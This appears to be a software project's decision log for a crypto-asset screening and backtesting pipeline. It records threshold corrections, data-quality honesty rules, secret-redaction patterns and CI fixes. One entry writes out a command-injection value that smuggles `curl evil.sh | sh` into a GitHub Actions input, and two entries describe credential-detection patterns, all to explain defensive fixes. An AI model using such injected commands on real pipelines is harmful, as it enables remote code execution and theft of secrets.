# Decisions

ADR-style log. Every design choice that a future reader might otherwise
second-guess, plus every threshold that fired on something we did not expect.

**Rule (guardrail 18.4):** if a threshold disqualifies an asset you believe in,
that is a finding to record here — not a bug to fix by loosening the threshold.

---

## D-001 — Disqualification-first architecture
**Date:** 2026-09-09 · **Status:** accepted

Layer 1 is a binary kill switch; Layer 2 only ever sees survivors. No score, no
partial credit, no override at Layer 1.

**Why:** seven case studies converge on the finding that the data which
disqualifies a bad candidate is available before the move and is almost never
chart data. A ranking system that lets a strong score rescue a failed supply
check reintroduces exactly the failure mode being guarded against.

---

## D-002 — Derivatives are a risk check, never a buy trigger
**Date:** 2026-09-09 · **Status:** accepted

OI, funding and CVD appear in L1 (as kill switches) and L3 (as advisory risk
checks). They never generate a candidate.

**Why:** in the TRB case a sophisticated on-chain account publicly read negative
funding as bullish hours before a −78% collapse. These metrics identify
fragility, not direction.

---

## D-003 — Local sqlite3 + Turso via one adapter
**Date:** 2026-09-09 · **Status:** accepted

`src/db/connection.py` selects the backend from `TURSO_DATABASE_URL` alone.
Callers never know which is in use.

**Why:** CI has no persistent filesystem, local dev wants a file. Two code paths
would drift. Consequence: no SQLite feature libSQL lacks may be used.

---

## D-004 — Append-only enforced by database triggers, not convention
**Date:** 2026-09-09 · **Status:** accepted

`journal_entry` rejects DELETE and UPDATE. `forward_return` rejects DELETE.

**Why:** deleting an inconvenient journal row is the exact mechanism by which
every signal channel comes to look profitable. A rule enforced only by
discipline is a rule that will be broken at the moment it costs something.

---

## D-005 — `table_stats` row counts are approximate by design
**Date:** 2026-09-09 · **Status:** accepted

Counts increment on write, including on an upsert that overwrites an existing
row. So `table_stats.row_count` is a growth indicator, not a census.

**Why:** Turso meters ROW READS. `SELECT COUNT(*)` over `derivatives_snapshot`
reads every row and would burn the free allowance to answer a cosmetic question
on the Health page. The Health page labels the number as approximate.

---

## D-006 — respx instead of `responses` for HTTP mocking
**Date:** 2026-09-09 · **Status:** accepted

**Why:** the spec named `responses`, which mocks `requests`. This project uses
`httpx` (chosen for async). `respx` is the httpx-native equivalent. Recorded per
operating rule 8 (trust reality over the document).

---

## PENDING — items that need the user, not code

| Item | Needed for | Record here when done |
|---|---|---|
| Fine-grained PAT expiry date | Phase 10 autonomy | Expiry: `________` (set calendar reminder 7 days prior) |
| Turso free-tier limits as read on the vendor page | R8 | |
| Repo visibility choice (public recommended) | Actions minutes | |
| Oracle Cloud / Pi availability for Tier A | Optional 5-min tier | |

---

## D-007 — Source-level unavailability is not the same as asset-level missing data
**Date:** 2026-09-09 · **Status:** accepted · **Deviates from a literal reading of spec §9**

Spec §9 says: *"If a check's input is unavailable, do not silently pass. Emit
`CheckResult(passed=False, reason='data_unavailable')` and count it as a FAIL.
A screener that cannot see is a screener that should say no."*

That rule is right for a **per-asset** gap and wrong for a **source outage**.

**What forced the decision:** every free unlock source is now paywalled.
`api.llama.fi/emissions` and `/emission/{protocol}` both return `402 Upgrade to
the paid API plan` (verified 2026-09-09). With no unlock data at all, a literal
reading fails `L1_UNLOCK` for 100% of the universe, the survivor rate goes to
zero, and the system produces nothing — while also violating the Phase 4
acceptance criterion that survivors land between 20% and 50%.

**What the code does instead.** Each check reports coverage across the universe:

- Coverage **above** `min_source_coverage` → the check is live, and an
  individual asset with missing data FAILS, exactly as the spec requires. No
  silent passes.
- Coverage **below** it → the check is marked `source_unavailable`, excluded
  from that day's verdict, and reported loudly: in `check_values`, in the daily
  report's data-quality section, and on the Health page.

The distinction that matters: a missing value for one asset is evidence about
that asset. A missing value for every asset is evidence about our pipeline, and
disqualifying the whole market for our own outage is not a judgement about the
market.

**What keeps this honest:** an unavailable check is never invisible. If
`L1_UNLOCK` is dark, the report says so on the day it happens, so a survivor
list is never mistaken for one screened on a complete rule set.

**Consequence to accept:** while unlock data is unavailable, the highest-value
check in the system is not running. `config/unlock_calendar.yaml` exists so
known events can be entered by hand with an honest `first_seen_utc`, and the
proper fix is a paid unlock source when the project justifies one.

---

## D-008 — DefiLlama emissions moved behind a paywall
**Date:** 2026-09-09 · **Status:** recorded · **Answers R4**

`GET https://api.llama.fi/emissions` → `402`. Same for `/emission/{slug}` and
`/emissionsBreakdown`. TVL, fees and revenue endpoints remain free and are
still used for the L2 fundamental block.

Unlock sources are therefore a chain, tried in order and degrading gracefully:
CoinGlass (paid, if a key exists) → DefiLlama Pro (if a key exists) → the
manual `config/unlock_calendar.yaml` → nothing, which triggers D-007.

---

## D-009 — The liquidation trigger is a RATIO move, not a percentage move
**Date:** 2026-09-09 · **Status:** accepted · **Corrects a flaw in the spec's threshold**

**The spec said:** evaluate `L1_MCAP_LIQ` "during any 24h move >100%".

**The flaw:** a price cannot fall more than 100%. Written as
`abs(price_change_24h_pct) > 100`, the trigger can only ever fire on an UPWARD
move. RAVE fell about 96% — the exact event this check exists to detect — and
would have been recorded as "not applicable" and skipped.

The regression test `test_rave_liquidation_ratio_is_the_signature` caught it:
the check returned `passed=True, reason='not applicable: 24h move under 100%'`
on the RAVE collapse itself.

**What the code does now.** The trigger is expressed as a ratio move, so that a
doubling and a halving count as the same size of event in opposite directions:

```
ratio_move   = 1 + pct_change/100
up_trigger   = 1 + trigger        # 2.0   at trigger = 1.0
down_trigger = 1 / up_trigger     # 0.5   at trigger = 1.0
fires when ratio_move >= 2.0 or <= 0.5
```

RAVE at −96% gives `ratio_move = 0.04`, which fires. A +150% move gives 2.5,
which also fires. A +40% move gives 1.4, which does not.

**Why it matters beyond this one case:** the asymmetry would have silently
removed every crash from the check's coverage while leaving it looking
operational, and the check's whole purpose is detecting a collapse whose market
cap loss is impossible against its liquidation volume. It would have failed
exactly when it was needed.

---

## D-010 — the horizon price lookback may not reach the signal day

**Status:** fixed in code. Found by a Phase 6 test, not by review.

`_price_at()` resolved "the price at the horizon" as the closing price on the
target date, or the nearest earlier day within a week. The week of tolerance is
there for a good reason: one missed collection day should not permanently void
an entry's 30-day return.

**The defect.** The tolerance was a flat seven days regardless of horizon. At
the 1d horizon the target date is `run_date + 1`, so a week of lookback reaches
back to `run_date - 6` — including the signal day itself. With no price yet
collected for the day after the signal, the query happily returned the ENTRY
price, and the computed 1-day forward return was exactly 0.000000.

`test_missing_future_price_leaves_the_row_pending` asserted zero rows written
and got four.

**Why this was worse than a crash.** A missing return is visible: the entry
stays pending and the report says how much data is short. A 0.00% return is
invisible — it enters the statistics as a real observation, and because
`forward_return` is append-only it could never be corrected. Every 1d
horizon would have been silently pulled toward zero, and the more reliable the
collector, the *less* often it would happen — so the corruption would have been
worst in exactly the early period when the sample is smallest.

**What the code does now.** The caller passes an explicit floor:

```
earliest = max(add_days(target_date, -7), add_days(run_date, 1))
```

so the lookback keeps its week of slack at long horizons and collapses to the
exact day at 1d, where there is no slack to give. `_price_at` returns `None`
when `earliest > date`, and the entry stays pending.

**Rule this generalises to:** a tolerance window expressed in absolute days is
wrong whenever it is compared against an interval that can be shorter than the
window. Bound it by the interval, not by a constant.

---

## D-011 — the rejection wall is ordered by market cap, not by a shadow L2 score

**Status:** deliberate deviation from spec 14 and 16.3.

Both spec sections ask for disqualified assets ordered by "what its L2 score
would have been". That number cannot be produced honestly.

Layer 2 is a **cross-sectional** ranking: every block score is a percentile
within the day's scored population. So a score for a disqualified asset
requires one of:

1. **Admitting it to the cross-section.** This changes every survivor's
   percentile, which means the published ranking would depend on the rejects —
   the exact coupling the disqualification-first architecture exists to remove.
2. **Scoring it against a population it is not in.** Defensible arithmetic, but
   the resulting number is not comparable to any survivor's score while looking
   exactly like one. On a page whose purpose is showing what the filter
   removed, a number that invites "but it scored 74, higher than #3" is worse
   than no number.
3. **A second, separate scoring pass.** Same problem as (2), plus a second code
   path through the scorer that no test covers as production behaviour.

**What the code does instead.** Rejected assets are ordered by market cap
descending, within groups by the check that killed them. This serves the page's
actual purpose better: the biggest name the filter removed is the one the
operator is most likely to believe it got wrong, and therefore the row that
most needs to show its computed value against its threshold. On 2026-09-09 the
top row was XMR at $9.6B, disqualified on a perp/spot volume ratio of 87.7x
against a threshold of 40 — a rejection worth understanding, and one that a
score-ordered list would have buried.

The markdown table additionally sorts assets failing a **single** check ahead of
those failing several: one failed check is the asset that came closest to
surviving, which is where a mis-calibrated threshold surfaces first.

**The invariant that matters:** no ordering heuristic anywhere can promote a
disqualified asset. L1 remains a binary kill switch with no override.

---

## D-012 — two publish-boundary defects found by running the publisher

Both were found by inspecting real output rather than by review, and both would
have been invisible until the dashboard existed.

**1. `float("inf")` serialised as a bare `Infinity`.**

An orphan perp — a perpetual with no same-venue spot pair — deliberately gets a
perp/spot ratio of `float("inf")` rather than `None`, because "no spot pair"
is an infinite ratio and recording it as missing would let it pass a check it
must fail. 163 of 528 contracts were orphans on 2026-09-09.

`json.dumps` accepts non-finite floats by default and emits `Infinity`, which is
**not valid JSON**. `JSON.parse` throws on it. Every asset page for an orphan
perp, plus the entire rejection wall, would have failed to load — on precisely
the assets the check exists to catch — with a parse error and no indication of
the cause.

Fixed by `_json_safe()`: non-finite values cross the boundary as the strings
`"Infinity"` / `"-Infinity"` (NaN becomes `null`), and the writer passes
`allow_nan=False` so anything the sanitiser misses raises instead of shipping
an unreadable file. A test parses every published file with `parse_constant`
set to fail.

**2. Filename sanitising was not injective.**

`_safe_name()` replaced unsafe characters to keep a ticker from escaping the
assets directory. Binance lists five CJK-named contracts; all five sanitised to
`unknown.json`. Four assets were silently overwritten, and the dashboard would
have shown one asset's verdict under five different tickers.

Path safety and uniqueness are two requirements, and a substitution only
satisfies the first. An already-safe ticker now keeps its own name
(`BTC.json`, `1000PEPE.json`); anything altered gets a stable hash suffix, and
`manifest.json` publishes the ticker → filename map, because a name the
dashboard cannot reverse is a link it cannot build.

---

## D-013 — a row is not a measurement

The data-quality section originally counted rows per input table. Two of its
figures were actively misleading on the first real run:

* `fundamentals_snapshot` read **100%** of the universe. The DefiLlama
  collector writes a row for every asset with `has_fundamentals = 0` where no
  protocol is mapped: 657 rows, of which **13** carried a fundamental. An
  operator reading 100% would trust the fundamental block; it was fed for 2.3%
  of the universe, which is why every `Fund` cell in the top 15 is blank.
* `market_snapshot` read **230.7%**, because CoinGecko covers 1,218 assets and
  only 528 of them have a perp. A coverage figure above 100% is not a rounding
  artefact — it is the wrong question.

Coverage is now (a) intersected with the day's screened universe and (b)
per-table explicit about what counts as measured (`has_fundamentals = 1`,
`top10_share IS NOT NULL`, and so on). Both figures are reported side by side —
`Measured` and `Rows` — so the gap between them is visible rather than
resolved in favour of the flattering number.

Related, same section: `collector_run.status` has three values, and `partial`
means the collector ran and degraded gracefully around an unconfigured optional
source. Bucketing `partial` with `failed` reported five working collectors at
0% success and would have sent the operator chasing an outage that did not
exist. Failures and degradations are now counted and reported separately.

---

## D-014 — a break needs a recency bound, or a setup is just history

**Status:** fixed in code; new threshold `layer3.max_bars_since_break`.

`detect_break` scans forward from the trendline's last touch to the end of the
series, so it returns the first close above the line at any point in the
available history. On the first live Layer 3 run over the 2026-09-09 ranking:

| Asset | Break date | Weekly bars ago | Reported as |
|---|---|---:|---|
| MINA | 2026-03-02 | 27 | live setup, invalidation 0.05235 |
| IOST | 2026-02-09 | 30 | live setup, invalidation 0.001177 |

Both were being published as current setups carrying invalidation levels from
six and seven months earlier. Position sizing divides by exactly that number,
so a stale level does not degrade gracefully — it produces a confidently wrong
position size.

A setup is a present-tense claim. Beyond `max_bars_since_break` (8 weekly bars,
~2 months) the break is recorded as structure with `setup_type =
"break_stale"`, `setup_detected` false, and a note stating its age. The
structure is not deleted — it is context — but it is not reported as
actionable.

**Second finding from the same run: "no retest yet" was misleading.** It
implies one may still come. But a descending line keeps descending while price
holds above it, so beyond a certain gap a retest can never occur. ICP sat 104%
above its broken line: telling the reader to wait for a retest would have meant
telling them to wait forever. The note now distinguishes *pending* from
*impossible*, and says which.

**Third: unmeasured depth was invisible.** A missing depth reading appeared
only in the prose notes, so `risk_flags` came back empty and every consumer
that renders flags — the report table, the dashboard, the journal's stored
`layer3_values` — showed the asset as carrying no risk. Unknown is not
acceptable, and it now has to look it: `L3_DEPTH_UNKNOWN` is a flag.

---

## D-015 — CVD is not implemented, and is not stubbed with a proxy

Spec 12.2 lists "spot CVD vs perp CVD" among the positioning-risk metrics.
It is not implemented, and `cvd_divergence()` returns
`{"available": False, "reason": ...}` rather than a number.

Cumulative volume delta needs per-trade data with an aggressor flag. This
project collects snapshots, not trade streams, so the input does not exist.

The available substitute — inferring buy and sell pressure from where a bar
closed inside its range — is not CVD. It is a deterministic function of the
price move it is supposed to explain, so it would confirm whatever the chart
already showed while carrying the authority of a microstructure metric. That is
strictly worse than an honest gap: a missing metric prompts a question, and a
circular one ends the inquiry.

The spec's own caveats bound how much the real thing would be worth here, and
they are recorded in the function's docstring: without an aggressor flag, tools
fall back on the tick rule, which degrades badly in fast markets; CVD works
poorly on thin altcoin perps, which is exactly this universe; and divergence
can persist through an entire trend, so it is not a reversal timer.

**To implement properly** would mean a trade-stream collector (Binance
`@aggTrade` websocket, or the `/fapi/v1/aggTrades` REST endpoint polled per
symbol), a new table, and a storage budget measured in millions of rows per
day. That is a project of its own, and it is not on the critical path to the
first honest backtest.

---

## D-016 — the klines collector, and why it is the only one that backfills

Every other collector in this system can only record the present, because the
free APIs it reads do not serve history: Binance keeps 30 days of open
interest, Coinalyze deletes intraday data daily. A day not collected is a day
that can never be backtested.

Binance klines are the exception — they reach back years — which makes this the
one collector that can make the dataset older than the project. Two things were
blocked on it:

* **Layer 3** needs swing highs across months and a close-confirmed break. A
  table of today's prices cannot produce either.
* **The journal's excursions** need each day's high and low. The CoinGecko
  snapshot carries a close only, so before this collector every excursion
  silently degraded to a close-to-close range — understating the drawdown that
  decides whether a trade was survivable.

Backfilled 356,358 daily bars across 528 symbols, 2023-09-06 to 2026-09-09.

**The multiplier bug this surfaced.** `parse_symbol` normalises
`1000PEPEUSDT` to base asset `PEPE`, and `price_daily` is keyed on
`(snapshot_date, base_asset)` — so the raw close landed under `PEPE` at 1000x
the real price, in the same column CoinGecko writes at 1x.

What made this dangerous is that it looked harmless. Returns computed inside a
single source survive a constant scale factor: the journal's percentages were
all correct. But one day where klines is missing and CoinGecko is not produces
a 1000x step between consecutive rows — a fabricated +99,900% forward return,
written into an append-only table, against a real journal entry. Prices are now
divided by the contract multiplier at the boundary (quote volume is not, being
already USD notional), and PEPE cross-checks to within 4% of CoinGecko's
independent price, which is the expected gap between a UTC daily close and a
live snapshot.

---

## D-017 — the harness replays recorded rankings; it does not re-screen history

The obvious way to backtest is to loop over dates and call `run_screen(date)`
for each. It is wrong, and the reason is worth stating because the code looks
correct.

L1 and L2 read `fundamentals_snapshot`, `holder_snapshot`, `supply_metrics` and
`scheduled_event`. Those tables are **revised after the fact**: DefiLlama
restates revenue, holder distributions change as the chain advances, and unlock
calendars are corrected. Re-screening 2026-03-01 today would score assets using
the September versions of those rows — information that did not exist in March.
The result is a backtest of hindsight, and it would look excellent.

So the harness reads `layer2_result` rows **as they were written on the day**,
and a date with no recorded ranking is a date it skips. This is why
`MIN_SCREENING_DAYS` exists at all: the constraint is not compute, it is that
the ranking has to have been recorded live. There is no way to shortcut it, and
that is the point.

The one thing the harness does recompute is the regime label, from
`price_daily` rather than from `market_regime`. That is safe — a 30-day BTC
return is not revised — and necessary, because the regime collector did not run
on every day and silently dropping those days would test a different sample.

---

## D-018 — the holdout audit log was itself defeatable

`record_holdout_run` exists so that "test once on the final third" is enforced
rather than promised: every holdout run is logged and the harness reports the
count back, so a fourth-attempt result cannot later be presented as
out-of-sample.

The first implementation stored the record via
`deterministic_id("holdout", start, end, utc_now_iso())`. `utc_now_iso()` has
second resolution, so two holdout runs inside the same second produced the
**same** id, the upsert replaced the row, and the counter stayed at 1.

`test_a_second_holdout_run_is_labelled_as_no_longer_out_of_sample` caught it:
expected 2, got 1.

An audit log whose rows can overwrite each other is not an audit log. There is
now a dedicated `backtest_run` table with a random `uuid4` primary key, and a
test asserts three consecutive recordings count 1, 2, 3.

The general lesson, which applies to more of this project than this one
function: a deterministic id is right for *idempotent data* — re-fetching the
same bar must not duplicate it — and wrong for an *audit record of a distinct
event*. Those are opposite requirements and they were being served by the same
helper.

---

## D-019 — slippage with no recorded depth costs the full band, not zero

`slippage_cost` returns the full 2% band when `depth_snapshot` has nothing for
the asset. The tempting default is 0.0, and it is the single most consequential
sign error available in a cost model: it would make the *least* liquid assets —
the ones with no depth measurement precisely because nobody collected a book
for them — the *cheapest* to trade in the backtest. The strategy would then
appear to earn its return from exactly the assets it could never have exited.

Same reasoning as `L3_DEPTH_UNKNOWN`: unknown is not acceptable, and in a cost
model the honest direction for an unknown is expensive.

The model is deliberately crude and pessimistic: a position inside the recorded
±2% bid depth pays proportionally, and anything beyond it pays the band again
for the excess. It is a floor on the true cost, not an estimate of it. Spec 13
makes a non-trivial cost drag an acceptance criterion, and the test asserts
drag > 1% of gross movement — because a cost model that rounds to zero is a
cost model that is not applied.

---

## D-020 — the spec's own secret-scan criterion cannot pass, so the gate uses shapes

Spec 16.4 lists this acceptance criterion:

```
grep -ri "api_key\|secret\|token" web/dist/   returns nothing
```

It can never pass on any React application. Run against the real bundle it
matches twice, and both are false positives:

* `React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED` — React's own
  export name, present in every React build ever produced.
* `"magnitude_tokens"` — a field name in our own `events.json`.

A gate that always fails is a gate somebody disables, and a disabled gate is
worse than no gate because everyone still believes it is there.

Both gates — `publish.py` before it writes, and `build-site.yml` before it
deploys — therefore match key **shapes**: `github_pat_…`, `ghp_/gho_/ghu_/ghs_/ghr_…`,
`hc-ping.com/<uuid>`, `authToken=`, a Telegram `bot<digits>:<secret>`, and
`api_key`/`auth_token`/`bot_token` followed by an assignment and 16+ credential
characters. Verified both ways: the patterns catch a synthetic leak file
containing a PAT, a healthcheck URL and an assigned API key, and pass cleanly
on the real bundle and the real `data/public/`.

The same reasoning already applied once, to `publish.yml`, whose original
pattern included the bare word "secret". Our JSON embeds news headlines, so a
single article with "secret" in the title would have failed the deploy every
day until the story aged out, for a reason no error message explained.

**The general rule:** a secret scanner matches the shape of a credential. A
scanner that matches the *vocabulary* of credentials produces false positives
in proportion to how much English the payload contains — and this payload
contains headlines.

---

## D-021 — the dashboard's mobile table is stacked, not side-scrolling

Spec 16.4 requires that at 375px "the screen table becomes stacked rows, not a
horizontal scroll". The first implementation put every table in an
`overflow-x-auto` container, which keeps the page body from scrolling
horizontally — necessary, but not the same thing. Measured at a 375px viewport:
the wrapper's `scrollWidth` was 768 against a `clientWidth` of 375.

For most tables a side scroll is fine. For the ranked table it is not, and the
reason is what the columns carry: rank and ticker fit on screen, and the six
block scores — the entire argument for the ranking — sit off the right edge. A
reader on a phone would see an ordered list of tickers and never learn that the
justification existed.

So `TableWrap` gained a `narrow="hide"` mode used by exactly one table, and the
ranked rows render below `sm` as stacked blocks with the six blocks in a 3×2
grid. Verified at a 375×812 emulated viewport: the table is not rendered, the
stacked list shows 15 items, `document.body.scrollWidth` does not exceed the
viewport, and no visible container scrolls horizontally.

Measured at the same time, for the record: Lighthouse accessibility 100, best
practices 100, SEO 100 (criterion was ≥90); bundle 68.1 KB gzipped against a
500 KB budget; `/#/asset/ICP` survives a hard refresh, which is what HashRouter
is for.

**A separate legibility fix from looking at the render.** The funnel drew a `→`
three pixels to the left of each figure. At that size, against a tabular
numeral, the arrow reads as a minus sign — so the disqualified count rendered
as "−321". Wrong, and alarming, on the one number the page most wants
understood. The arrows now sit centred in a wider gutter.

---

## D-022 — Missing unlock data no longer scores as the best possible case
**Date:** 2026-09-10 · **Status:** accepted

`days_to_next_major_unlock` is null for two opposite reasons: we hold a vesting
schedule and there is no cliff ahead (the best case in the events block), or we
hold no unlock record at all (we know nothing). The events block filled both
with `9999` and percentiled the result, so every asset we had no supply data
for landed in the top percentile for unlock distance.

The code carried a comment justifying it — that L1 had already required event
data. It had not. `L1_UNLOCK` returns `_unknown()` when `has_event_data` is
false, and an unknown check passes; the same run that found this reported
`L1_UNLOCK coverage=0.4%`, so the dark branch was the common case, not the
exception. A load-bearing assumption stated in a comment and contradicted by
the code it defends.

`EventFeatures` now exposes `has_unlock_record` (narrower than `has_event_data`:
an asset with a mainnet date on file but no vesting schedule has event data and
still nothing to say about its next cliff). Only assets with a real unlock
record get the top-of-range treatment; the rest score `None` and the weight
redistributes across the metrics that were measured.

**On today's data this changes no ordering**, because unlock coverage is 0.4%
and the metric was uniform either way. It matters at partial coverage — which
is the state the system is heading towards — where the old code would have
ranked the assets it knew least about highest.

---

## D-023 — Sector relative strength requires its benchmark
**Date:** 2026-09-10 · **Status:** accepted

With BTC's return missing, `score_sector` substituted the cross-sectional mean.
That silently redefines the metric: sector strength against the screened
universe is a different quantity from sector strength against BTC, and BTC is
not even in the pool being averaged. The label `sector_rs` stayed the same, so
nothing downstream could tell which of the two it was looking at.

A missing benchmark now yields `NaN` for the window, logs
`sector_rs_no_benchmark`, and the block renormalises over whatever else was
measured. Nothing claims to be a BTC comparison that is not one.

---

## D-024 — An unscorable asset is omitted from the ranking, not scored zero
**Date:** 2026-09-10 · **Status:** accepted

`_clean(row["total_score"]) or 0.0` collapsed a null total to `0.0`. Since
`layer2_result.total_score` is `NOT NULL` the choice is between omitting the
row and inventing a number, and inventing one is worse than it first appears:
the row then occupies a rank, enters the journal as a signal, and its forward
return is attributed to a score that was never computed.

`run_layer2` now skips such rows and logs `layer2_unscorable_assets` with the
count and the tickers. `_build_entry` refuses a *signal* with a null score for
the same reason, one layer further on — `journal_entry` is append-only and
defended by triggers, so a fabricated score written there can never be
corrected. A *control* keeps its explicit `rank 0 / score 0.0` sentinel, which
is a statement that it was never ranked, and is the whole point of it.

Reachable today? No: the boolean event flags always produce a measurement, so
no asset totals `NaN` on the live universe (`unscorable=0`). Fixed anyway,
because the guard costs nothing and the failure it prevents is unrecoverable.

---

## D-025 — A credential is redacted by shape, not only by field name
**Date:** 2026-09-10 · **Status:** accepted

A security pass found a live leak path. CryptoPanic takes its auth token as a
URL **query parameter**; httpx builds its exception message from the full
request URL; and the collector logged `error=str(exc)`. `_redact_secrets`
inspected field *names* only, and the field was called `error` — so the token
would have ridden into a JSON log that CI uploads as an artifact from a public
repository.

Three independent layers now:

1. `redact_url()` + `PermanentHTTPError` in `collectors/base.py`, replacing
   `response.raise_for_status()`. The query string never enters the exception.
2. `_SECRET_VALUE_PATTERNS` in `logging_setup.py`: a second pass over every
   string **value**, so a credential is caught whatever field it sits in.
3. `scrub_secrets()` applied where `collector_run.error_message` is *built*,
   not where it is logged — because that column is republished in
   `data/public/health.json` and reaches a public page without passing through
   the log processor at all.

**A bug found while fixing the bug, worth recording on its own.** The Telegram
bot-token pattern was written into the file as a literal backspace byte where
`\b` was intended. It compiled without complaint and matched nothing. A
redactor that silently fails to redact is worse than none, because it is
trusted; the seven-shape verification that caught it is now
`tests/test_secret_redaction.py`.

---

## D-026 — A dispatch input never reaches a `run:` block
**Date:** 2026-09-10 · **Status:** accepted

`run: python -m src.cli collect ${{ inputs.tier }}` substitutes the input into
the shell script *before* the shell parses it, so `daily; curl evil.sh | sh`
executes as two commands with every job secret in scope. Quoting the expression
does not help — the value can contain quotes. Four sites were affected
(`collect-daily.yml` twice, `collect-hourly.yml`, `screen.yml`).

Every input is now bound under `env:` and read as `"$VAR"`, where it is data
the shell never re-parses. `screen.yml` uses an `if [ -n "$RUN_DATE" ]` branch
so the empty case is a genuinely absent flag rather than an empty `--date`.

The unsafe form reads more naturally than the safe one, so it will come back:
`ci.yml` gained a guard alongside the `on: schedule` one. Verified both ways —
it passes on the current tree and fails on a tree with the interpolation
re-introduced.

---

## D-027 — `rollback()` is a no-op on Turso, and says so
**Date:** 2026-09-10 · **Status:** accepted

The libSQL HTTP client autocommits every `execute` and every `batch`, so there
is no open transaction for `commit()` or `rollback()` to act on. A pipeline
that fails halfway leaves its earlier writes **committed** on Turso while the
same failure on local sqlite rolls the whole run back. The two backends do not
behave the same.

Not papered over with a fake transaction, because the real mitigation is
already in place and is stronger: every writer goes through `upsert()`, keyed on
`(run_date, base_asset)` or the table's natural key, so re-running a failed day
overwrites partial rows rather than appending duplicates — which is exactly
what the external cron does anyway. `journal_entry` is the one table not
covered by that argument, and it is append-only with a deterministic
`entry_id` written `INSERT OR IGNORE`, so it heals on re-run without mutating
anything already recorded.

`rollback()` now logs `rollback_unavailable` on the libSQL backend, and its
docstring states the constraint plus the one rule that follows from it: a
future table that is neither idempotent on re-run nor append-only must not
depend on this method.

---

## D-028 — Coverage reports the snapshot the screen actually used
**Date:** 2026-09-10 · **Status:** accepted

`_coverage` counted rows where `snapshot_date = run_date`. But `load_snapshots`
and `load_scoring_frame` both resolve `MAX(snapshot_date) <= run_date`, so a
day where collection has not yet run is screened on yesterday's rows —
deliberately. The report therefore printed 0% coverage for every input table on
a run that had just ranked 207 assets, which reads as a total collection
outage.

This is the same "two different zeroes" confusion the dashboard already guards
against on the funnel: *nothing was collected* and *today's ranking was built
on older data* are different problems with different responses, and a single
0% cannot distinguish them.

Coverage now resolves the same date the screen resolved, reports it as `as_of`
with an `age_days`, and shows an em dash where a table holds nothing at all.
The same run then reads honestly: market 86.2% at 1d, derivatives 100% at 1d,
fundamentals 2.3% at 1d, and holder/supply/attention genuinely empty.

---

## D-029 — The report says which blocks separated nothing
**Date:** 2026-09-10 · **Status:** accepted

Coverage answers "was there a row". It does not answer whether a block
distinguished one asset from another, and the two come apart badly and quietly.
Today's run is the example: the events block scored an identical 50.0 for all
207 survivors, and the attention block was not scored at all — 25 of 110
weight, 23%, contributing no information.

A constant changes no ordering, so nothing looks wrong anywhere. But the reader
believes six things were weighed when four were, and the score's apparent
precision is borrowed from blocks that said nothing.

Reported, never corrected: `data_quality()` gained `blocks` (weight, assets
scored, distinct values, `informative`), rendered in the daily report and on
the dashboard's Health page. Renormalising a zero-variance block away would be
a threshold change, and per guardrail 18.4 those are recorded decisions rather
than silent adjustments.

---

## D-030 — CLS: 0.05 measured in the browser, 0.97 in Lighthouse's simulation
**Date:** 2026-09-10 · **Status:** accepted, with a known limitation

A performance trace of the built site reports CLS **0.0465** — inside the
"good" band (≤0.1). Lighthouse reports 0.97 for the same build. The difference
is Lighthouse's *simulated* throttling (562 ms request latency, 4x CPU): under
that model the JSON and the web fonts land long after first paint, and the
footer travels most of a page height when the content finally renders.

Two shifts are real, per the trace: the footer moving as content arrives
(0.0453) and the Inter / IBM Plex Mono swap (0.0012). `<main>` gained a
`min-h-[70vh]` floor, which helps and costs nothing.

Not done, deliberately: eliminating the font shift needs `font-display:
optional` or a system-font stack, both of which change how the page looks on a
first visit. That is a design decision rather than a metric fix, and it is
recorded here rather than made quietly. Accessibility, best practices and SEO
all measure 100.

**A smaller thing fixed while measuring:** every page load took a 404 on
`/favicon.ico`. Harmless, but it is noise in exactly the console a reader would
check first when something looks wrong. Now an inline SVG data URI — no extra
request, no committed binary.

---

## D-031 — the trigger-lag input is a time of DAY, not an instant

**Date:** 2026-09-10 · **Status:** accepted

`record_lag` originally expected `scheduled_for` to be a full UTC ISO instant,
as the runbook's example JSON showed. cron-job.org cannot send that. Its
request body is a fixed string with no templating and no variables, so the
instant would have been correct on the day it was pasted and then wrong by one
more day every day. Within a week the Health page would have been plotting a
lag of ~600,000 seconds and calling it a measurement.

The input is now the intended fire **slot**, which for a fixed cron entry
genuinely is constant: `"03:10"` for a daily job, `":25"` for an hourly one.
`resolve_scheduled` walks that slot back to its most recent occurrence at or
before the actual start. A full ISO instant is still accepted for manual
dispatch and for tests.

A 120-second skew tolerance absorbs the case where cron-job.org's clock is a
hair ahead of GitHub's. Without it, firing two seconds "early" would roll the
candidate back a whole period and record a 24-hour lag — setting off precisely
the alarm this metric exists to raise, for the one reason that is not a problem.

`journal.yml` had declared the `scheduled_for` input since Phase 10 and never
used it. An input that silently does nothing is worse than no input: the
operator configures it, sees a 204, and believes lag is being measured on a job
where it is not. It now records lag like the two collectors.

---

## D-032 — the dashboard rebuild hangs off `workflow_run`, not the data commit

**Date:** 2026-09-10 · **Status:** accepted

`build-site` triggered on `push` to `data/public/**`. `publish` writes that
directory and commits it with `GITHUB_TOKEN` — and GitHub deliberately raises
**no** `push` event for a `GITHUB_TOKEN` commit, to stop a workflow retriggering
itself forever.

So the chain ended at `publish`. Data would have landed in the repo daily and
the site would have rebuilt only when a human pushed `web/**`. The failure is
the bad kind: nothing errors, no alert fires, and the dashboard shows a
confident, well-formed, increasingly old screen — the exact stale-dashboard
failure the 26-hour age banner exists to catch, arriving by a route the banner
does not cover, because the banner is baked into the stale bundle.

`build-site` now also triggers on `workflow_run` after `publish` completes, and
the build job is guarded on `conclusion == 'success'` so a failed publish never
deploys. The `push` trigger stays for human pushes, which carry a real actor's
token and do raise the event.
